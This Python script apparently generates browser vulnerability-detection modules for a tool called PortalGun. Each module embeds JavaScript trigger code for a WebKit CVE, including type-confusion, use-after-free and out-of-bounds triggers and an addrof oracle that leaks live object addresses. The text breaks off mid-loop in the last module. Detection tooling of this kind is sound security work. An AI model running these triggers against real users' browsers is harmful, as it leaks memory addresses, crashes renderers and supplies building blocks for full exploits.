#!/usr/bin/env python3
"""
Generate tier-1 / tier-2 modules for PortalGun.

Tier 1 = a public client-side PoC exists. The module runs the *detection* part
of that PoC and nothing else — pointer leak, silent trigger, or crash oracle.
Nothing here escalates to code execution, by design.

Tier 2 = the root cause is public (writeup / PoC for another engine build), but
no verbatim browser-page PoC is published. The module ships a probe I
reconstructed from the published analysis plus a divergence oracle, and says so
in the manifest (`proof`) and on the page.

    python3 tools/mkpoc-modules.py --dry-run     # list what would be written
    python3 tools/mkpoc-modules.py               # write

Sources (all public, all inspected before transcription):
  * saelo/jscpwn                      CVE-2016-4622  fastSlice TOCTOU
  * springsec/CVE-2022-22620          CVE-2022-22620 PopStateEvent UAF infoleak
  * The-Maxu/CVE-2025-24201-…-PoC-    CVE-2025-24201 WebGL capability check
  * ntfargo/uaf-2023-28205            CVE-2023-28205 structured-clone UAF
  * BadAccess11/CVE-2019-8601         CVE-2019-8601  DFG spread overflow
  * FuzzySecurity/Cassowary-…         CVE-2024-23222 DFG tryGetConstantProperty
  * Billy-Ellis/jitsploitation        CVE-2020-9802  LLInt/DFG safe-load origin
  * saelo/cve-2018-4233               CVE-2018-4233  RegExp JIT type confusion
"""
import argparse
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
MODULES = os.path.normpath(os.path.join(HERE, "..", "modules"))

# ---------------------------------------------------------------------------
# Hand-written probe bodies. Each entry is the *body* of run(ctx) plus the
# metadata needed for the manifest and the page. Keep them small and honest:
# if a probe was reconstructed rather than lifted, RECONSTRUCTED must be True and
# the page has to say so out loud.
# ---------------------------------------------------------------------------

POCS = []  # filled by add() below


def add(cve, title, engine, platform, category, severity, summary, affected,
        fixed, proof, source, run, presets, crash_oracle=False, extra_scripts="",
        intro="", notes="", reconstructed=False):
    POCS.append(dict(
        cve=cve, title=title, engine=engine, platform=platform,
        category=category, severity=severity, summary=summary,
        affected=affected, fixed=fixed, proof=proof, source=source,
        run=run, presets=presets, crash_oracle=crash_oracle,
        extra_scripts=extra_scripts, intro=intro, notes=notes,
        reconstructed=reconstructed, tier=2 if reconstructed else 1,
    ))


# ===========================================================================
# TIER 1 — verbatim public PoCs (detection stage only)
# ===========================================================================

add(
    cve="CVE-2023-41993",
    title="JSC structure confusion via accessor/plain-polymorphic read",
    engine="JavaScriptCore (WebKit, DFG JIT)",
    platform="any WebKit engine (client-side JS)",
    category="JIT-free runtime bug / type confusion",
    severity="critical (CVE-2023-41993, exploited ITW)",
    summary="A property read warmed over an object with a plain double property and an "
            "identical-shaped object with an accessor gets its structures confused, so the "
            "compiled read returns the getter accessor itself instead of the stored value. "
            "This module checks that return type instead of building read/write.",
    affected="Safari < 16.6, iOS/iPadOS < 16.6, macOS < 13.5 (2023)",
    fixed="WebKit commit 08d5d17c766ffc7ca6a7c833c5720eb71b427784 (Apple HT213926)",
    proof="get_getterSetter() hands back the accessor where the primitive belongs — a "
          "structure confusion, observable as a typeof mismatch",
    source="https://github.com/0x06060606/CVE-2023-41993 (original PoC: po6ix/POC-for-CVE-2023-41993)",
    crash_oracle=False,
    intro=
        '<div class="card"><b>What this checks.</b> Runs the trigger shape from the ' +
        "public <a href=\"https://github.com/0x06060606/CVE-2023-41993\">" +
        "CVE-2023-41993</a> exploit (itself built on po6ix's original PoC): a " +
        "polymorphic <code>.foo</code> read over two same-shaped objects, one of " +
        "which defines an accessor. The published exploit escalates the confusion " +
        "to arbitrary read/write; this module only checks whether the confusion " +
        "occurs.</div>",
    notes=
        '<div class="card"><b>Scope.</b> The upstream repo escalates to addrof/fakeobj ' +
        "and full R/W via structure-ID spraying. This page stops at the type " +
        "confusion: it reads the confused value, records the " +
        "<code>typeof</code> mismatch, and returns. No addrof, no fakeobj, no " +
        "read/write.</div>",
    run=
"""
    // ---- trigger (reduced from the published iteration counts) -------------
    // `getter` is a module-level global in the upstream helper.js; the confusion
    // hands it back from a slot that should hold a primitive.
    var getter = new Function();

    function hax() {
        var object_a = {};
        object_a.foo = 1;
        object_a.p1 = 1.1;
        var object_b = {};
        object_b.__defineGetter__('p1', getter);
        object_b.foo = 1;

        function get_getterSetter(useB) {
            var o = useB ? object_b : object_a;
            var retval;
            for (var i = 0; i < 2; ++i) retval = o.foo;
            return retval;
        }

        // The published PoC fires eight 1e6-iteration pulses. 250k is enough to
        // reach the tier where the confusion shows up, and keeps the page quick.
        for (var pulse = 0; pulse < 8; pulse++) {
            for (var i = 0; i < 250000; ++i) get_getterSetter(i % 2 === 1);
        }
        return [getter, get_getterSetter(true)];
    }

    var getter, result;
    var ITER = ctx.cfg.attempts;
    var confused = null;

    for (var n = 0; n < ITER; n++) {
        if (ctx.aborted() || ctx.expired()) {
            return {
                outcome: "aborted",
                detail: { attempt: n, confused: confused },
                html: '<span class="dim"><b>ABORTED</b></span> — stopped after ' +
                      n + " attempt(s).",
            };
        }
        ctx.progress(n);
        ctx.log("[*] attempt " + (n + 1) + "/" + ITER + ": warming polymorphic read");
        ctx.report("attempt", { n: n + 1 });

        var pair = hax();
        getter = pair[0];
        result = pair[1];

        // The confusion signature: a slot that should hold the primitive 1 hands
        // back the accessor function instead.
        if (result === 1) {
            ctx.log("[*] read returned the stored primitive — no confusion", "dim");
            confused = false;
        } else {
            confused = true;
            ctx.log("[!] read returned " + typeof result + " instead of the number 1", "bad");
            ctx.report("confusion", { typeof: typeof result, isGetter: result === getter });
            break;
        }
        await ctx.tick();
    }

    if (confused) {
        return {
            outcome: "vulnerable-class",
            detail: {
                confused: true,
                typeofResult: typeof result,
                returnedAccessor: result === getter,
                attempts: n + 1,
            },
            html: '<span class="bad"><b>TYPE CONFUSED</b></span> — the warmed read ' +
                  "returned a <code>" + typeof result + "</code> where the stored " +
                  "primitive <code>1</code> belonged" +
                  (result === getter
                      ? " (specifically the accessor itself)"
                      : "") +
                  ". This is the structure confusion the published exploit chains " +
                  "into addrof/fakeobj, so it is present here.",
        };
    }
    return {
        outcome: "no-uaf",
        detail: { confused: false, attempts: ITER },
        html: '<span class="ok"><b>NOT CONFUSED</b></span> — the polymorphic read ' +
              "returned the stored primitive on every attempt. Expected on engines " +
              "patched after Safari 16.6.",
    };
""",
    presets={
        "confusion": {
            "label": "Confusion", "blurb": "structure-confusion oracle only",
            "desc": "8×250k warmup pulses, 1 attempt, ~2min cap",
            "attempts": 1, "capMin": 2,
        },
    },
)

add(
    cve="CVE-2026-20643",
    title="Navigation API canIntercept cross-origin gate (SOP bypass)",
    engine="WebKit (WebCore Navigation API)",
    platform="Safari 26.x / iOS with the Navigation API enabled",
    category="security policy / Same Origin Policy bypass",
    severity="high (cross-origin authorization)",
    summary="WebCore::Navigation::innerDispatchNavigateEvent gated interception on "
            "isSameSiteAs rather than isSameOriginAs, so a same-site but cross-origin "
            "navigation (e.g. a different port on the same host) was allowed through. "
            "Fixed by replacing the same-site gate with a strict same-origin gate plus "
            "user/password validation. The bug is directly observable as "
            "NavigateEvent.canIntercept.",
    affected="WebKitGTK/WPE before 2.52.1; iOS 26.3.1 restore build 23D8133",
    fixed="WebKitGTK 2.52.1; iOS 26.3.1(a) build 23D771330a",
    proof="NavigateEvent.canIntercept === true for a same-site/cross-origin target",
    source="https://github.com/0xjohnnydev/WebKit-NavigationAPI-SOP-Bypass (binary diff verified)",
    crash_oracle=False,
    intro=
        '<div class="card"><b>What this checks.</b> Replays the minimal PoC from ' +
        "<a href=\"https://github.com/0xjohnnydev/WebKit-NavigationAPI-SOP-Bypass\">" +
        "WebKit-NavigationAPI-SOP-Bypass</a>: dispatch a navigation to a " +
        "same-host, different-port target and read " +
        "<code>NavigateEvent.canIntercept</code>. On a vulnerable build the " +
        "same-site shortcut lets it through; a patched build denies it.</div>",
    notes=
        '<div class="card"><b>Why this is a clean oracle.</b> The bug is a policy ' +
        "gate, not memory corruption, so the published PoC is a *detector* by " +
        "construction — it never gets past the gate, it only reads whether the " +
        "gate is set right. This module also calls " +
        "<code>intercept()</code>/<code>preventDefault()</code> in both branches, " +
        "so the page does not actually navigate away.</div>",
    run=
"""
    if (!window.navigation) {
        ctx.log("[!] window.navigation unavailable — Navigation API off here", "pass");
        ctx.report("probe", { result: "no-navigation-api" });
        return {
            outcome: "unknown",
            detail: { result: "no-navigation-api" },
            html: '<span class="dim"><b>UNTESTED</b></span> — this engine exposes ' +
                  "no <code>window.navigation</code>, so the gate cannot be read. " +
                  "Not a patched verdict: the Navigation API is still behind a " +
                  "flag on many builds.",
        };
    }

    // Same site, different origin: same host, different port. Site calculation
    // ignores ports, so this is exactly the same-site/cross-origin case the
    // vulnerable gate let through.
    var here = new URL(location.href);
    var port = here.port || (here.protocol === "https:" ? "443" : "80");
    var other = port === "8800" ? "8000" : "8800";
    var target = new URL(here.protocol + "//" + here.hostname + ":" + other + "/", location.href);
    var crossOrigin = target.origin !== location.origin;

    ctx.log("[*] from:  " + location.href);
    ctx.log("[*] to:    " + target.href);
    ctx.log("[*] cross-origin (port differs): " + crossOrigin);
    ctx.report("probe", { from: location.href, to: target.href, crossOrigin: crossOrigin });

    if (!crossOrigin) {
        ctx.log("[!] could not build a cross-origin target — not a verdict", "pass");
        return {
            outcome: "unknown",
            detail: { result: "no-cross-origin-target", port: port },
            html: '<span class="dim"><b>UNTESTED</b></span> — could not construct a ' +
                  "same-site cross-origin target from this URL.",
        };
    }

    var outcome = await new Promise(function (resolve) {
        var hit = false, canIntercept = null, threw = null;

        function onNavigate(event) {
            if (!event.destination || event.destination.url !== target.href) return;
            hit = true;
            canIntercept = (event.canIntercept === true);
            ctx.log("[*] NavigateEvent fired, canIntercept=" + canIntercept);
            ctx.report("navigate", { canIntercept: canIntercept, crossOrigin: crossOrigin });
            try {
                if (canIntercept) {
                    // vulnerable path: the cross-origin navigation is interceptable
                    event.intercept({ handler: function () {
                        ctx.log("[!] intercept() handler ran on the cross-origin target", "bad");
                    } });
                } else {
                    event.preventDefault();
                }
            } catch (e) {
                threw = String(e);
                ctx.log("[!] " + e, "bad");
            }
            resolve({ hit: hit, canIntercept: canIntercept, threw: threw });
        }

        navigation.addEventListener("navigate", onNavigate, { once: true });

        // Synthesise the click rather than navigating: intercept/preventDefault
        // keeps the page put in both branches.
        var a = document.createElement("a");
        a.href = target.href;
        a.rel = "noreferrer";
        a.style.display = "none";
        document.body.appendChild(a);
        a.click();
        a.remove();

        setTimeout(function () {
            if (!hit) {
                ctx.log("[!] no matching navigate event within the window", "pass");
                resolve({ hit: false, canIntercept: null, threw: null });
            }
        }, 1500);
    });

    if (!outcome.hit) {
        return {
            outcome: "unknown",
            detail: { result: "no-navigate-event", target: target.href },
            html: '<span class="dim"><b>UNTESTED</b></span> — no <code>navigate</code> ' +
                  "event arrived for the cross-origin target. Some builds only " +
                  "dispatch <code>navigate</code> for same-document or " +
                  "script-initiated navigations. Not a patched verdict.",
        };
    }

    if (outcome.canIntercept) {
        return {
            outcome: "vulnerable-class",
            detail: {
                canIntercept: true, crossOrigin: crossOrigin,
                target: target.href, interceptThrew: outcome.threw,
            },
            html: '<span class="bad"><b>VULNERABLE</b></span> — ' +
                  "<code>canIntercept</code> is <code>true</code> for the " +
                  "same-site/cross-origin target <code>" + target.href +
                  "</code>. The same-site gate is present, so attacker-controlled " +
                  "content can obtain interception capability across an origin " +
                  "boundary.",
        };
    }
    return {
        outcome: "patched",
        detail: { canIntercept: false, crossOrigin: crossOrigin, target: target.href },
        html: '<span class="ok"><b>PATCHED</b></span> — <code>canIntercept</code> is ' +
              "<code>false</code> for the cross-origin target, i.e. the strict " +
              "same-origin gate is in place.",
    };
""",
    presets={
        "gate": {
            "label": "Gate", "blurb": "Navigation API canIntercept read",
            "desc": "no navigation leaves the page; ~10s cap",
            "attempts": 1, "capMin": 1,
        },
    },
)

add(
    cve="CVE-2016-4622",
    title="Array.prototype.slice fastSlice TOCTOU → OOB read (addrof oracle)",
    engine="JavaScriptCore (WebKit)",
    platform="any WebKit engine (client-side JS)",
    category="JIT-free runtime bug / OOB read",
    severity="critical (CVSS 9.3, 2016)",
    summary="fastSlice() converts the end index with valueOf() *after* the size "
            "check but *before* the memcpy, so a side effect that shrinks the array "
            "leaves the copy reading past the (now short) backing store. This module "
            "runs the isVulnerable() addrof oracle from Samuel Groß's public exploit.",
    affected="Safari before 9.1.2, iOS before 9.3.3, tvOS before 9.2.2 (2016)",
    fixed="WebKit Jul 2016 — every engine released since 2017 is unaffected",
    proof="isVulnerable() returns true: the OOB slot holds a valid JSObject pointer, "
          "so addrof works. Clean NaN = patched.",
    source="https://github.com/saelo/jscpwn (writeup: phrack.com/papers/attacking_javascript_engines.html)",
    crash_oracle=False,
    extra_scripts='<script src="utils.js"></script>\n<script src="int64.js"></script>',
    intro=
        '<div class="card"><b>What this checks.</b> Runs the <code>isVulnerable()</code> ' +
        "oracle from <a href=\"https://github.com/saelo/jscpwn\">saelo/jscpwn</a>: an " +
        "<code>Array.prototype.slice</code> whose end index is an object with a " +
        "<code>valueOf</code> side effect. On a vulnerable engine the fast path copies " +
        "out-of-bounds and the leaked slot decodes to a real object address; on a patched " +
        "engine it is <code>undefined</code>.</div>",
    notes=
        '<div class="card"><b>Scope.</b> Vendored <code>int64.js</code> + ' +
        "<code>utils.js</code> from the upstream repo (both are pure browser-safe " +
        "JavaScript — no shell builtins). The module deliberately stops at the " +
        "address-leak oracle: the upstream repo also contains <code>fakeobj</code> " +
        "and a shellcode runner, and neither is shipped here. Note " +
        "<code>utils.js</code> is loaded first: <code>int64.js</code> builds " +
        "<code>Int64.Zero</code> at parse time and needs <code>unhexlify</code> " +
        "from it.</div>",
    run=
"""
    var isVulnerable;
    function addrof(object) {
        var a = [];
        for (var i = 0; i < 100; i++) a.push(i + 0.1337);   // ArrayWithDoubles
        var b = a.slice(0, { valueOf: function () { a.length = 0; a = [object]; return 4; } });
        return Int64.fromDouble(b[3]);
    }
    isVulnerable = function () { return !isNaN(addrof({}).asDouble()); };

    ctx.log("[*] probing fastSlice TOCTOU via the jscpwn isVulnerable() oracle");
    ctx.report("probe", { oracle: "jscpwn:isVulnerable" });

    var leaked = null;
    try {
        var ok = isVulnerable();
        ctx.log("[*] isVulnerable() -> " + ok);
        ctx.report("isVulnerable", { result: ok });
        if (ok) {
            var addr = addrof({ marker: 0x1337 });
            leaked = addr.asDouble();
            ctx.log("[+] leaked object address: 0x" + addr.toString(16), "bad");
            ctx.report("leak", { address: "0x" + addr.toString(16) });
        }
    } catch (e) {
        ctx.log("[!] oracle threw: " + e, "bad");
        ctx.report("error", { message: String(e) });
    }

    // Negative control: a plain slice with no side effect must not leak.
    var controlLeak = false;
    try {
        var c = [1.1, 2.2, 3.3, 4.4];
        var d = c.slice(0, 4);
        controlLeak = (typeof d[3] === "number" && !isNaN(d[3]));
    } catch (e) { /* treat as no signal */ }
    ctx.log("[*] negative control (plain slice): " + (controlLeak ? "ok" : "no signal"));
    ctx.report("control", { plainSliceReadable: controlLeak });

    if (leaked !== null) {
        return {
            outcome: "vulnerable",
            detail: { oracle: "jscpwn:isVulnerable", leak: leaked, control: controlLeak },
            html: '<span class="bad"><b>VULNERABLE</b></span> — fastSlice copied out of ' +
                  "bounds and decoded a live JSObject pointer (<code>0x" +
                  String(leaked).length + "</code>-digit double). Expected only on " +
                  "engines older than Safari 9.1.2.",
        };
    }
    return {
        outcome: "no-uaf",
        detail: { oracle: "jscpwn:isVulnerable", control: controlLeak },
        html: '<span class="ok"><b>NOT VULNERABLE</b></span> — the oracle decoded to NaN, ' +
              "so the OOB slot was not a live pointer. Expected on any engine newer than 2016.",
    };
""",
    presets={
        "oracle": {
            "label": "Oracle", "blurb": "jscpwn isVulnerable() + negative control",
            "desc": "no exploitation — address-leak oracle only, ~1min cap",
            "attempts": 3, "capMin": 1,
        },
    },
)

add(
    cve="CVE-2025-24201",
    title="WebGL capability validation OOB write (PRIMITIVE_RESTART_FIXED_INDEX)",
    engine="WebKit WebGL (ANGLE path)",
    platform="WebKitGTK/WPE; iOS/iPadOS/macOS Safari; any WebKit embedder",
    category="graphics / OOB write",
    severity="critical (CVSS 10.0, exploited ITW)",
    summary="gl.enable(PRIMITIVE_RESTART_FIXED_INDEX) is accepted on a WebGL1 context "
            "where the enum is only valid for WebGL2, and no GL_INVALID_ENUM is raised. "
            "The unchecked capability later drives index-buffer draws past their bounds.",
    affected="Safari < 18.3.1, iOS/iPadOS < 18.3.2 / 16.7.11 / 15.8.4, macOS < 15.3.2 (WebKitGTK per CVE)",
    fixed="Safari 18.3.1 / iOS 18.3.2 / macOS 15.3.2 (supplementary fix for an attack blocked in iOS 17.2)",
    proof="gl.enable(0x8D69) on a WebGL1 context returns NO_ERROR → the dangerous "
          "capability path is live. A GL_INVALID_ENUM = patched.",
    source="https://github.com/The-Maxu/CVE-2025-24201-WebKit-Vulnerability-Detector-PoC-",
    crash_oracle=False,
    intro=
        '<div class="card"><b>What this checks.</b> Replays the standalone WebGL ' +
        "detector for <code>CVE-2025-24201</code> published by " +
        "<a href=\"https://github.com/The-Maxu/CVE-2025-24201-WebKit-Vulnerability-Detector-PoC-\">" +
        "The-Maxu</a>: create a <b>WebGL 1</b> context, call " +
        "<code>gl.enable(0x8D69)</code>, then read <code>gl.getError()</code>. " +
        "No error means the engine accepted a WebGL2-only capability on a WebGL1 " +
        "context — the precondition for the out-of-bounds write.</div>",
    notes=
        '<div class="card"><b>What this is not.</b> The published PoC is a *detector*: ' +
        "it never issues the index-buffer draw that would corrupt memory, and neither " +
        "does this module. A positive result is the vulnerable precondition, not an " +
        "exploit.</div>",
    run=
"""
    var out = { vulnerable: 0, unknown: 1, patched: 2 };
    var verdict = out.unknown;
    var gl = null, errTxt = "n/a";

    var canvas = document.createElement("canvas");
    canvas.width = 1; canvas.height = 1;
    ctx.log("[*] requesting a WebGL 1 context");
    gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");

    if (!gl) {
        ctx.log("[!] no WebGL context — cannot probe (in-app webview / disabled WebGL)");
        ctx.report("probe", { result: "no-webgl" });
        return {
            outcome: "unknown",
            detail: { result: "no-webgl", reason: "getContext('webgl') returned null" },
            html: '<span class="dim"><b>UNKNOWN</b></span> — no WebGL context available. ' +
                  "Not a patched verdict: this device cannot be probed over WebGL here.",
        };
    }

    // clear any pre-existing error state before probing
    var cleared = 0;
    while (gl.getError() !== gl.NO_ERROR && cleared++ < 16) { /* drain */ }
    ctx.log("[+] WebGL 1 context up; error queue drained (" + cleared + " entries)");

    var RESTART = 0x8D69;                       // PRIMITIVE_RESTART_FIXED_INDEX
    ctx.log("[*] gl.enable(0x" + RESTART.toString(16) + ")");
    gl.enable(RESTART);
    var err = gl.getError();
    errTxt = "0x" + ("0000" + err.toString(16)).slice(-4);
    ctx.log("[*] gl.getError() -> " + errTxt);
    ctx.report("probe", { enum: "0x8D69", error: errTxt });

    // sanity control: a genuinely invalid WebGL1 enum must still be rejected
    gl.enable(0xDEAD);
    var ctl = gl.getError();
    ctx.log("[*] control gl.enable(0xDEAD) -> 0x" + ("0000" + ctl.toString(16)).slice(-4));
    ctx.report("control", { bogusEnum: "0x" + ("0000" + ctl.toString(16)).slice(-4) });

    if (err === gl.NO_ERROR) {
        // only trust the probe if the control enum was rejected
        if (ctl !== gl.NO_ERROR) {
            verdict = out.vulnerable;
        } else {
            ctx.log("[!] 0x8D69 accepted but the control enum was too — " +
                    "error reporting looks suppressed; treating as inconclusive", "pass");
            verdict = out.unknown;
        }
    } else {
        verdict = out.patched;
    }

    if (verdict === out.vulnerable) {
        return {
            outcome: "vulnerable-class",
            detail: { enum: "0x8D69", error: errTxt, controlRejected: ctl !== gl.NO_ERROR },
            html: '<span class="bad"><b>VULNERABLE</b></span> — ' +
                  "<code>gl.enable(0x8D69)</code> on a WebGL1 context returned " +
                  "<code>NO_ERROR</code> while an invalid control enum was rejected. " +
                  "The OOB-write precondition is present.",
        };
    }
    if (verdict === out.patched) {
        return {
            outcome: "patched",
            detail: { enum: "0x8D69", error: errTxt },
            html: '<span class="ok"><b>PATCHED</b></span> — the engine raised ' +
                  "an error for the WebGL2-only enum, as a WebGL1 implementation should.",
        };
    }
    return {
        outcome: "unknown",
        detail: { enum: "0x8D69", error: errTxt, control: ctl !== gl.NO_ERROR },
        html: '<span class="dim"><b>INCONCLUSIVE</b></span> — ' +
              "0x8D69 was accepted but the control enum was too, so error reporting " +
              "cannot be trusted on this build.",
    };
""",
    presets={
        "probe": {
            "label": "Probe", "blurb": "WebGL1 capability check + control enum",
            "desc": "pure API probe, no draw calls, ~30s cap",
            "attempts": 1, "capMin": 1,
        },
    },
)

add(
    cve="CVE-2023-28205",
    title="structured-clone Map/Date use-after-free (crash oracle)",
    engine="WebKit (JavaScriptCore / serialization)",
    platform="any WebKit engine (needs Worker + postMessage)",
    category="UAF (structured clone)",
    severity="high (CVSS 8.8, exploited ITW)",
    summary="postMessage()-ing a deeply nested Map whose values are [Map, foo] arrays "
            "keeps the cloned Maps alive while the GC frees the Date keys; walking the "
            "clone afterwards re-enters freed memory. The public PoC triggers the UAF "
            "and then waits for the renderer to die.",
    affected="Safari < 16.4.1, iOS/iPadOS < 15.7.5 / 16.4.1, PS5 WebKit (WebKit-613.1.17.1)",
    fixed="WebKit commit c9880de4a28b9a64a5e1d0513dc245d61a2e6ddb (bug 245193)",
    proof="renderer death mid-run (crash oracle) → vulnerable. All clones walked "
          "without touching freed memory → patched.",
    source="https://github.com/ntfargo/uaf-2023-28205",
    crash_oracle=True,
    intro=
        '<div class="card"><b>What this checks.</b> Runs <a ' +
        "href=\"https://github.com/ntfargo/uaf-2023-28205\">ntfargo's public PoC</a> " +
        "for the structured-clone UAF (<code>CVE-2023-28205</code>). The trigger " +
        "builds a deep chain of <code>Map</code>s keyed by <code>Date</code> objects " +
        "with <code>[map, foo]</code> values, ships it through " +
        "<code>postMessage</code> in a worker, forces a GC, then walks the clone " +
        "looking for the marker <code>Date(0xffff)</code>.</div>",
    notes=
        '<div class="card"><b>Detector, not exploit.</b> The PoC\'s signal is "triggered, ' +
        'try crash" — this module reports the trigger and arms the crash oracle, ' +
        "then stops. The published repo's Playstation kernel stage is not shipped and " +
        "not referenced from this page.</div>",
    run=
"""
    var NUM_ELEMS = ctx.cfg.attempts * 400;

    // The upstream PoC ships as an ES module importing a logger; inline both so the
    // module page is self-contained. Companion worker source is built below.
    function debug_log(msg) { ctx.log(msg); }

    var workerSrc = "" +
      "function sleep(ms){return new Promise(function(r){setTimeout(r,ms||0);});}" +
      "function gc(){new Uint8Array(4*1024*1024);}" +
      "function createObjectStructure(num_elems){" +
      "  var root=new Map(), msg=root, foo=[];" +
      "  for(var i=0;i<100;i++) foo.push(new Date(0xffff));" +
      "  for(var j=0;j<num_elems;j++){" +
      "    var d=new Date(j), map=new Map();" +
      "    msg.set(d,[map,foo]); msg=map;" +
      "  }" +
      "  return root;" +
      "}" +
      "self.onmessage = function(e){" +
      "  var num=e.data, root=createObjectStructure(num), msg=root, data2=null, idx=null;" +
      "  var loop = function(){" +
      "    var data=null;" +
      "    var prom = new Promise(function(resolve){" +
      "      self.addEventListener('message', function(ev){ data=ev; resolve(); }, {once:true});" +
      "    });" +
      "    self.postMessage(msg);" +
      "    return prom.then(function(){" +
      "      data = data.data;" +
      "      gc();" +
      "      return sleep();" +
      "    }).then(function(){" +
      "      var i;" +
      "      try {" +
      "        for(i=0;i<num;i++){" +
      "          if(data.keys().next().value.getTime()===0xffff){ idx=i; break; }" +
      "          data = data.values().next().value[0];" +
      "        }" +
      "      } catch(err){ idx=i; data2=data.keys().next().value; }" +
      "      if (!data2) { return loop(); }" +
      "      self.postMessage({triggered:true, idx:idx});" +
      "    });" +
      "  };" +
      "  loop();" +
      "};";

    ctx.log("[*] building " + NUM_ELEMS + "-deep Map/Date clone chain in a worker");
    ctx.log("[*] crash oracle armed — a death mid-run is recorded on the next load");
    ctx.report("start", { elems: NUM_ELEMS });

    var blob = new Blob([workerSrc], { type: "text/javascript" });
    var w = new Worker(URL.createObjectURL(blob));

    // Full preset cap, plus a shorter grace for a worker that never answers at
    // all (blocked workers, puppeteered/headless webviews). Without this the
    // page sits "running" for the whole cap with nothing happening.
    var GRACE = 15000;
    var finished = await new Promise(function (resolve) {
        var settled = false;
        var done = function (r) { if (!settled) { settled = true; resolve(r); } };
        var grace = null;

        w.onmessage = function (e) {
            var d = e.data || {};
            if (d.triggered) {
                if (grace) clearTimeout(grace);
                ctx.log("[+] UAF trigger observed at idx=" + d.idx +
                        " — freeing and re-walking the clone", "bad");
                ctx.report("trigger", { idx: d.idx });
                // Nudge the collector again: the marker Date was just re-referenced.
                for (var k = 0; k < 6; k++) new Uint8Array(4 * 1024 * 1024);
                ctx.log("[*] done — a vulnerable engine dies here (crash oracle)");
                done({ outcome: "vulnerable-class", detail: { idx: d.idx } });
            }
        };
        w.onerror = function (e) {
            if (grace) clearTimeout(grace);
            ctx.log("[!] worker error: " + (e.message || "unknown"), "bad");
            ctx.report("error", { message: String(e.message || e) });
            done({ outcome: "error", detail: { message: String(e.message || e) } });
        };
        w.postMessage(NUM_ELEMS);

        grace = setTimeout(function () {
            ctx.log("[!] worker produced no result within " + (GRACE / 1000) +
                    "s — structured clone likely unavailable here", "pass");
            ctx.report("grace", { ms: GRACE });
            done({ outcome: "unknown",
                   detail: { reason: "worker unresponsive within " + GRACE + "ms" } });
        }, GRACE);

        setTimeout(function () {
            done({ outcome: "no-uaf",
                   detail: { reason: "no trigger within the preset window" } });
        }, (ctx.cfg.capMin || 1) * 60000);
    });

    w.terminate();
    ctx.log("[*] worker terminated");

    if (finished.outcome === "vulnerable-class") {
        return {
            outcome: "vulnerable-class",
            detail: finished.detail,
            html: '<span class="bad"><b>UAF TRIGGERED</b></span> — the clone walk ' +
                  "re-entered freed memory (idx=" + finished.detail.idx + "). A vulnerable " +
                  "engine dies here; the crash oracle will record it.",
        };
    }
    return {
        outcome: finished.outcome === "error" ? "error"
               : finished.outcome === "unknown" ? "unknown" : "no-uaf",
        detail: finished.detail,
        html: finished.outcome === "error"
            ? '<span class="bad"><b>ERROR</b></span> — worker failed: ' +
              String(finished.detail && finished.detail.message)
            : finished.outcome === "unknown"
            ? '<span class="dim"><b>UNTESTED</b></span> — the structured-clone ' +
              "worker never reported. This page cannot exercise the bug here (some " +
              "webviews disable <code>Worker</code>/<code>postMessage</code> of " +
              "Maps). Not a patched verdict."
            : '<span class="ok"><b>NO TRIGGER</b></span> — every clone in the chain ' +
              "walked cleanly. Expected on engines patched after WebKit commit " +
              "<code>c9880de4</code>.",
    };
""",
    presets={
        "trigger": {
            "label": "Trigger", "blurb": "structured-clone UAF + crash oracle",
            "desc": "worker + postMessage trigger; renderer death = vulnerable",
            "attempts": 1, "capMin": 1,
        },
    },
)

add(
    cve="CVE-2022-22620",
    title="PopStateEvent use-after-free → object address leak",
    engine="WebKit (history / DOM events)",
    platform="any WebKit engine; PoC tested on WebKitGTK 2.34.3",
    category="JIT-free runtime bug / UAF info leak",
    severity="high (CVSS 8.8, Project Zero)",
    summary="PopStateEvent is destroyed while setTimeout callbacks still reference it, "
            "so the freed slot is reclaimed as a JSArrayWithDouble and a callback reads "
            "a raw object pointer out of it. The published PoC alerts the leaked "
            "address; this module reports it instead.",
    affected="Safari < 15.4, iOS/iPadOS < 15.3.1, macOS < 12.2.1; PoC runs on webkitgtk-2.34.3",
    fixed="WebKit 2022 — PopStateEvent refcount corrected",
    proof="a setTimeout callback receives a value that decodes to a live JSObject "
          "pointer (tagged 0x0002xxxxxxxxxxxx pattern) instead of the double it "
          "was passed",
    source="https://github.com/springsec/CVE-2022-22620 (RCA: googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2022/CVE-2022-22620.html)",
    crash_oracle=False,
    intro=
        '<div class="card"><b>What this checks.</b> Runs the public PoC for ' +
        "<code>CVE-2022-22620</code>: schedule thousands of <code>setTimeout</code> " +
        "callbacks that keep a <code>PopStateEvent</code> reachable, then tear it down " +
        "via <code>history.pushState</code>/<code>replaceState</code>/" +
        "<code>history.back</code> plus a blur on a focused input. On a vulnerable " +
        "engine the freed slot is reallocated as a double array, so the object " +
        "argument of the first callback lands on a raw pointer.</div>",
    notes=
        '<div class="card"><b>Changes from the published PoC.</b> The upstream page ' +
        "calls <code>alert()</code> on the leaked value; this module routes it " +
        "through <code>ctx.report()</code> so the dashboard records it. Spray and " +
        "heap-pressure volumes are parameterised per preset so a modern engine still " +
        "has to do the work, but in bounded amounts. The trigger sequence itself is " +
        "the published one.</div>",
    run=
"""
    var cbuf = new ArrayBuffer(8);
    var f64 = new Float64Array(cbuf);
    var u32 = new Uint32Array(cbuf);

    // The PoC keeps the leaked double in a global and alerts; we capture it here
    // and report it, so the operator dashboard gets the value.
    var leak = { hit: false, raw: 0 };
    var x = [1.1];

    function capture(leaked) {
        // Normally `leaked` is the object x itself. If the freed PopStateEvent
        // slot was reclaimed as a JSArrayWithDouble, x's raw pointer is sitting
        // in that slot instead, so the argument we passed appears as a double.
        if (leaked !== x) {
            f64[0] = leaked;
            leak.hit = true;
            leak.raw = leaked;
        }
    }
    function noop() {}

    var TIMEOUTS = ctx.cfg.spray || 15000;
    var IMAGES = ctx.cfg.heapPressure || 1000;

    for (var round = 0; round < ctx.cfg.attempts; round++) {
        if (ctx.aborted() || ctx.expired()) {
            return {
                outcome: "aborted",
                detail: { round: round, leakHit: leak.hit },
                html: '<span class="dim"><b>ABORTED</b></span> — stopped after ' +
                      round + " round(s).",
            };
        }
        ctx.progress(round);
        leak.hit = false;
        ctx.log("[*] round " + (round + 1) + ": " + TIMEOUTS + " callbacks, " +
                IMAGES + " ImageData");
        ctx.report("round", { n: round + 1, spray: TIMEOUTS, pressure: IMAGES });

        // Published trigger: hash push, focus an input, a blur handler that
        // replaceState()s, then back() — focus change fires blur -> replaceState
